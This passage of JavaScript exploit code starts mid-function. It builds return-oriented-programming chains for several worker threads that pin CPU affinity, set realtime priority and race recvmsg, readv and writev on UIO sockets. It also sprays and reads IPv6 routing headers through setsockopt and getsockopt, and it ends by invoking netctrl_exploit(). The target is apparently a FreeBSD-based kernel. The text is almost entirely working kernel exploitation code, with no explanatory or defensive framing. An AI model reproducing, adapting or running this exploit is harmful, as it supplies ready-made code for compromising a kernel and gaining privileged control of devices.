  write16(cpu_mask, 1 << MAIN_CORE);
  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(CPU_LEVEL_WHICH));
  rop.push(gadgets.POP_RSI_RET);
  rop.push(new BigInt(CPU_WHICH_TID));
  rop.push(gadgets.POP_RDX_RET);
  rop.push(BigInt_Error);
  rop.push(gadgets.POP_RCX_RET);
  rop.push(new BigInt(CPU_SET_SIZE));
  rop.push(gadgets.POP_R8_RET);
  rop.push(cpu_mask);
  rop.push(cpuset_setaffinity_wrapper);
  var rtprio_buf = malloc(4);
  write16(rtprio_buf, PRI_REALTIME);
  write16(rtprio_buf.add(2), MAIN_RTPRIO);
  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(RTP_SET));
  rop.push(gadgets.POP_RSI_RET);
  rop.push(new BigInt(0));
  rop.push(gadgets.POP_RDX_RET);
  rop.push(rtprio_buf);
  rop.push(rtprio_thread_wrapper);
  rop.push(gadgets.POP_RDI_RET);
  rop.push(ready_signal);
  rop.push(gadgets.POP_RAX_RET);
  rop.push(new BigInt(1));
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
  var loop_init = rop.length;
  rop.push(gadgets.POP_RDI_RET);
  rop.push(run_fd);
  rop.push(gadgets.POP_RSI_RET);
  rop.push(signal_buf);
  rop.push(gadgets.POP_RDX_RET);
  rop.push(new BigInt(1));
  rop.push(read_wrapper);
  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(iov_sock_0));
  rop.push(gadgets.POP_RSI_RET);
  rop.push(msg);
  rop.push(gadgets.POP_RDX_RET);
  rop.push(new BigInt(0));
  rop.push(recvmsg_wrapper);
  rop.push(gadgets.POP_RDI_RET);
  rop.push(done_signal);
  rop.push(gadgets.POP_RAX_RET);
  rop.push(new BigInt(1));
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
  var loop_end = rop.length;
  var loop_size = loop_end - loop_init;
  return {
    rop,
    loop_size
  };
}
function uio_readv_worker_rop(ready_signal, run_fd, done_signal, signal_buf) {
  var rop = [];
  rop.push(new BigInt(0));
  var cpu_mask = malloc(0x10);
  write16(cpu_mask, 1 << MAIN_CORE);
  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(CPU_LEVEL_WHICH));
  rop.push(gadgets.POP_RSI_RET);
  rop.push(new BigInt(CPU_WHICH_TID));
  rop.push(gadgets.POP_RDX_RET);
  rop.push(BigInt_Error);
  rop.push(gadgets.POP_RCX_RET);
  rop.push(new BigInt(CPU_SET_SIZE));
  rop.push(gadgets.POP_R8_RET);
  rop.push(cpu_mask);
  rop.push(cpuset_setaffinity_wrapper);
  var rtprio_buf = malloc(4);
  write16(rtprio_buf, PRI_REALTIME);
  write16(rtprio_buf.add(2), MAIN_RTPRIO);
  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(RTP_SET));
  rop.push(gadgets.POP_RSI_RET);
  rop.push(new BigInt(0));
  rop.push(gadgets.POP_RDX_RET);
  rop.push(rtprio_buf);
  rop.push(rtprio_thread_wrapper);
  rop.push(gadgets.POP_RDI_RET);
  rop.push(ready_signal);
  rop.push(gadgets.POP_RAX_RET);
  rop.push(new BigInt(1));
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
  var loop_init = rop.length;
  rop.push(gadgets.POP_RDI_RET);
  rop.push(run_fd);
  rop.push(gadgets.POP_RSI_RET);
  rop.push(signal_buf);
  rop.push(gadgets.POP_RDX_RET);
  rop.push(new BigInt(1));
  rop.push(read_wrapper);
  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(uio_sock_0));
  rop.push(gadgets.POP_RSI_RET);
  rop.push(uioIovWrite);
  rop.push(gadgets.POP_RDX_RET);
  rop.push(new BigInt(UIO_IOV_NUM));
  rop.push(readv_wrapper);
  rop.push(gadgets.POP_RDI_RET);
  rop.push(done_signal);
  rop.push(gadgets.POP_RAX_RET);
  rop.push(new BigInt(1));
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
  var loop_end = rop.length;
  var loop_size = loop_end - loop_init;
  return {
    rop,
    loop_size
  };
}
function uio_writev_worker_rop(ready_signal, run_fd, done_signal, signal_buf) {
  var rop = [];
  rop.push(new BigInt(0));
  var cpu_mask = malloc(0x10);
  write16(cpu_mask, 1 << MAIN_CORE);
  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(CPU_LEVEL_WHICH));
  rop.push(gadgets.POP_RSI_RET);
  rop.push(new BigInt(CPU_WHICH_TID));
  rop.push(gadgets.POP_RDX_RET);
  rop.push(BigInt_Error);
  rop.push(gadgets.POP_RCX_RET);
  rop.push(new BigInt(CPU_SET_SIZE));
  rop.push(gadgets.POP_R8_RET);
  rop.push(cpu_mask);
  rop.push(cpuset_setaffinity_wrapper);
  var rtprio_buf = malloc(4);
  write16(rtprio_buf, PRI_REALTIME);
  write16(rtprio_buf.add(2), MAIN_RTPRIO);
  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(RTP_SET));
  rop.push(gadgets.POP_RSI_RET);
  rop.push(new BigInt(0));
  rop.push(gadgets.POP_RDX_RET);
  rop.push(rtprio_buf);
  rop.push(rtprio_thread_wrapper);
  rop.push(gadgets.POP_RDI_RET);
  rop.push(ready_signal);
  rop.push(gadgets.POP_RAX_RET);
  rop.push(new BigInt(1));
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
  var loop_init = rop.length;
  rop.push(gadgets.POP_RDI_RET);
  rop.push(run_fd);
  rop.push(gadgets.POP_RSI_RET);
  rop.push(signal_buf);
  rop.push(gadgets.POP_RDX_RET);
  rop.push(new BigInt(1));
  rop.push(read_wrapper);
  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(uio_sock_1));
  rop.push(gadgets.POP_RSI_RET);
  rop.push(uioIovRead);
  rop.push(gadgets.POP_RDX_RET);
  rop.push(new BigInt(UIO_IOV_NUM));
  rop.push(writev_wrapper);
  rop.push(gadgets.POP_RDI_RET);
  rop.push(done_signal);
  rop.push(gadgets.POP_RAX_RET);
  rop.push(new BigInt(1));
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
  var loop_end = rop.length;
  var loop_size = loop_end - loop_init;
  return {
    rop,
    loop_size
  };
}
function ipv6_sock_spray_and_read_rop(ready_signal, run_fd, done_signal, signal_buf) {
  var rop = [];
  rop.push(new BigInt(0));
  var cpu_mask = malloc(0x10);
  write16(cpu_mask, 1 << MAIN_CORE);
  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(CPU_LEVEL_WHICH));
  rop.push(gadgets.POP_RSI_RET);
  rop.push(new BigInt(CPU_WHICH_TID));
  rop.push(gadgets.POP_RDX_RET);
  rop.push(BigInt_Error);
  rop.push(gadgets.POP_RCX_RET);
  rop.push(new BigInt(CPU_SET_SIZE));
  rop.push(gadgets.POP_R8_RET);
  rop.push(cpu_mask);
  rop.push(cpuset_setaffinity_wrapper);
  var rtprio_buf = malloc(4);
  write16(rtprio_buf, PRI_REALTIME);
  write16(rtprio_buf.add(2), MAIN_RTPRIO);
  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(RTP_SET));
  rop.push(gadgets.POP_RSI_RET);
  rop.push(new BigInt(0));
  rop.push(gadgets.POP_RDX_RET);
  rop.push(rtprio_buf);
  rop.push(rtprio_thread_wrapper);
  rop.push(gadgets.POP_RDI_RET);
  rop.push(ready_signal);
  rop.push(gadgets.POP_RAX_RET);
  rop.push(new BigInt(1));
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
  var loop_init = rop.length;
  rop.push(gadgets.POP_RDI_RET);
  rop.push(run_fd);
  rop.push(gadgets.POP_RSI_RET);
  rop.push(signal_buf);
  rop.push(gadgets.POP_RDX_RET);
  rop.push(new BigInt(1));
  rop.push(read_wrapper);
  for (var i = 0; i < ipv6_socks.length; i++) {
    rop.push(gadgets.POP_RDI_RET);
    rop.push(ipv6_socks[i]);
    rop.push(gadgets.POP_RSI_RET);
    rop.push(new BigInt(IPPROTO_IPV6));
    rop.push(gadgets.POP_RDX_RET);
    rop.push(new BigInt(IPV6_RTHDR));
    rop.push(gadgets.POP_RCX_RET);
    rop.push(spray_rthdr_rop.add(i * UCRED_SIZE));
    rop.push(gadgets.POP_R8_RET);
    rop.push(new BigInt(spray_rthdr_len));
    rop.push(setsockopt_wrapper);
  }
  for (var j = 0; j < ipv6_socks.length; j++) {
    rop.push(gadgets.POP_RDI_RET);
    rop.push(ipv6_socks[j]);
    rop.push(gadgets.POP_RSI_RET);
    rop.push(new BigInt(IPPROTO_IPV6));
    rop.push(gadgets.POP_RDX_RET);
    rop.push(new BigInt(IPV6_RTHDR));
    rop.push(gadgets.POP_RCX_RET);
    rop.push(read_rthdr_rop.add(j * 8));
    rop.push(gadgets.POP_R8_RET);
    rop.push(check_len);
    rop.push(getsockopt_wrapper);
  }
  rop.push(gadgets.POP_RDI_RET);
  rop.push(done_signal);
  rop.push(gadgets.POP_RAX_RET);
  rop.push(new BigInt(1));
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
  rop.push(gadgets.POP_RDI_RET);
  rop.push(new BigInt(0));
  rop.push(thr_exit_wrapper);
  return {
    rop,
    loop_size: 0
  };
}

/* ===========================
 *   Entry point
 * ===========================
 */

netctrl_exploit();